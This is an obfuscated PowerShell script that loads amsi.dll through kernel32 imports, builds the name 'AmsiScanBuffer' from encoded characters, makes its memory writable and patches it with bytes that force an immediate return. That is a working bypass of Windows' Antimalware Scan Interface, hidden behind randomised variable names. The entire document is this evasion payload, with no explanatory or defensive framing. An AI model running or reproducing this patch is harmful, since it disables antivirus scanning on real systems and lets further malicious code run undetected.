$OjqWeH0cyXr5MHcGIiF = @"
using System;
using System.Runtime.InteropServices;
public class OjqWeH0cyXr5MHcGIiF {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr HoJzHz, string EkxcjEJwD4);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr YvL1svUyM8k9, UIntPtr UwMQn4ULB9KT14n, uint mfTU14o9T, out uint MsFn);
}
"@

Add-Type $OjqWeH0cyXr5MHcGIiF

$sLEGrd2Gm79IS8M = [OjqWeH0cyXr5MHcGIiF]::LoadLibrary("$([Char]([bYte]0x61)+[char](109+80-80)+[chAr](115*113/113)+[cHar](105)+[CHaR]([bYTE]0x2e)+[char]([bytE]0x64)+[char]([BytE]0x6c)+[CHaR](108*70/70))")
$gmOqD7VhqnIlG6o34I = [OjqWeH0cyXr5MHcGIiF]::GetProcAddress($sLEGrd2Gm79IS8M, "$(('ÃmsîScánBû'+'ffêr').normalIZe([CHAR]([bytE]0x46)+[ChaR](39+72)+[cHar](114+101-101)+[chAr](109+21-21)+[ChaR]([BYTe]0x44)) -replace [char]([ByTe]0x5c)+[cHar](112+72-72)+[CHar]([bYte]0x7b)+[cHAr](77*60/60)+[CHar](110)+[cHAr]([bytE]0x7d))")
$p = 0
[OjqWeH0cyXr5MHcGIiF]::VirtualProtect($gmOqD7VhqnIlG6o34I, [uint32]5, 0x40, [ref]$p)
$_6gbnsFbsxJVqTFG = "0xB8"
$hGiAk9z = "0x57"
$IoVgE28 = "0x00"
$M7iYxwKDlxK = "0x07"
$v45Tqxs0 = "0x80"
$K2Saqdsn0LXKDfgvw5c = "0xC3"
$NXCPa = [Byte[]] ($_6gbnsFbsxJVqTFG,$hGiAk9z,$IoVgE28,$M7iYxwKDlxK,+$v45Tqxs0,+$K2Saqdsn0LXKDfgvw5c)
[System.Runtime.InteropServices.Marshal]::Copy($NXCPa, 0, $gmOqD7VhqnIlG6o34I, 6)